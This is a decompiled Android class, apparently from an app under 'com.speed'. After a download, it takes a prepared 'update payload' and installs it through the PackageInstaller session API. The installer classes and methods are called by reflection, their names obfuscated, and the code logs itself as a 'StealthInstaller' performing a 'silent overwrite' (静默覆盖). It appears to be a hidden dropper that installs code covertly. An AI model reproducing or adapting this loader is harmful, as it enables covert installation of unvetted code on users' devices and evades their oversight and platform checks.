package q1;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentSender;
import android.os.Build;
import com.speed.ad.NativePluginLoader;
import i2.p;
import j2.i;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import l3.h;
import u1.k;

/* JADX INFO: compiled from: r8-map-id-01bd2f78e356d1793fe12b6cab4b4ddc2ec9524fab1d39c14fcb56e383ba4015 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class a implements p {

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final /* synthetic */ Context f1769d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final /* synthetic */ String f1770e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public final /* synthetic */ File f1771f;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public final /* synthetic */ File f1772g;

    public /* synthetic */ a(Context context, String str, File file, File file2) {
        this.f1769d = context;
        this.f1770e = str;
        this.f1771f = file;
        this.f1772g = file2;
    }

    @Override // i2.p
    public final Object f(Object obj, Object obj2) {
        Throwable th = (Throwable) obj2;
        if (((Boolean) obj).booleanValue()) {
            NativePluginLoader nativePluginLoader = NativePluginLoader.f376a;
            String absolutePath = this.f1771f.getAbsolutePath();
            i.d(absolutePath, "getAbsolutePath(...)");
            File file = this.f1772g;
            String absolutePath2 = file.getAbsolutePath();
            i.d(absolutePath2, "getAbsolutePath(...)");
            Context context = this.f1769d;
            if (nativePluginLoader.prepareUpdatePayload(context, this.f1770e, absolutePath, absolutePath2)) {
                f1.f fVar = c.f1782e;
                if (!c.f1781d) {
                    IntentFilter intentFilter = new IntentFilter("com.speed.net.update.INSTALL_COMPLETE");
                    if (Build.VERSION.SDK_INT >= 33) {
                        context.getApplicationContext().registerReceiver(fVar, intentFilter, 4);
                    } else {
                        context.getApplicationContext().registerReceiver(fVar, intentFilter);
                    }
                    c.f1781d = true;
                }
                context.getApplicationContext().getSharedPreferences("AppPreferences", 0).edit().putBoolean("pending_play_store_restore", true).apply();
                e.a(context, 3);
                Intent intent = new Intent("com.speed.net.update.INSTALL_COMPLETE");
                intent.setPackage(context.getPackageName());
                IntentSender intentSender = (Build.VERSION.SDK_INT >= 31 ? PendingIntent.getBroadcast(context, 0, intent, 167772160) : PendingIntent.getBroadcast(context, 0, intent, 134217728)).getIntentSender();
                i.d(intentSender, "getIntentSender(...)");
                try {
                    h.a0("[StealthInstaller] installApkReflect: 准备通过反射调用 Installer...");
                    Object objInvoke = Class.forName(e.b(e.f1783a)).getMethod(e.b(e.f1784b), null).invoke(context.getPackageManager(), null);
                    Class<?> cls = Class.forName(e.b(e.f1786d));
                    Class<?> cls2 = Integer.TYPE;
                    Object objNewInstance = cls.getConstructor(cls2).newInstance(1);
                    Class<?> cls3 = Class.forName(e.b(e.f1785c));
                    Object objInvoke2 = cls3.getMethod(e.b(e.f1787e), cls).invoke(objInvoke, objNewInstance);
                    i.c(objInvoke2, "null cannot be cast to non-null type kotlin.Int");
                    Object objInvoke3 = cls3.getMethod(e.b(e.f1788f), cls2).invoke(objInvoke, (Integer) objInvoke2);
                    Class<?> cls4 = Class.forName(e.b(e.f1789g));
                    String strB = e.b(e.f1790h);
                    Class<?> cls5 = Long.TYPE;
                    Object objInvoke4 = cls4.getMethod(strB, String.class, cls5, cls5).invoke(objInvoke3, file.getName(), 0L, Long.valueOf(file.length()));
                    i.c(objInvoke4, "null cannot be cast to non-null type java.io.OutputStream");
                    OutputStream outputStream = (OutputStream) objInvoke4;
                    FileInputStream fileInputStream = new FileInputStream(file);
                    try {
                        byte[] bArr = new byte[8192];
                        for (int i4 = fileInputStream.read(bArr); i4 >= 0; i4 = fileInputStream.read(bArr)) {
                            outputStream.write(bArr, 0, i4);
                        }
                        fileInputStream.close();
                        cls4.getMethod(e.b(e.f1791i), OutputStream.class).invoke(objInvoke3, outputStream);
                        outputStream.close();
                        cls4.getMethod(e.b(e.f1792j), Class.forName("android.content.IntentSender")).invoke(objInvoke3, intentSender);
                        cls4.getMethod(e.b(e.f1793k), null).invoke(objInvoke3, null);
                        h.a0("[StealthInstaller] installApkReflect: APK 数据写入完成");
                    } catch (Throwable th2) {
                        try {
                            throw th2;
                        } catch (Throwable th3) {
                            h.j(fileInputStream, th2);
                            throw th3;
                        }
                    }
                } catch (Exception e4) {
                    h.a0("[StealthInstaller] installApkReflect: 静默覆盖失败 - " + e4.getClass().getSimpleName() + ": " + e4.getMessage());
                }
            } else {
                h.a0("[NoadUpdateManager] 更新载荷处理失败");
            }
        } else {
            a1.c.f("[NoadUpdateManager] 下载遭遇失败！error=", th != null ? th.getMessage() : null);
        }
        return k.f2301a;
    }
}
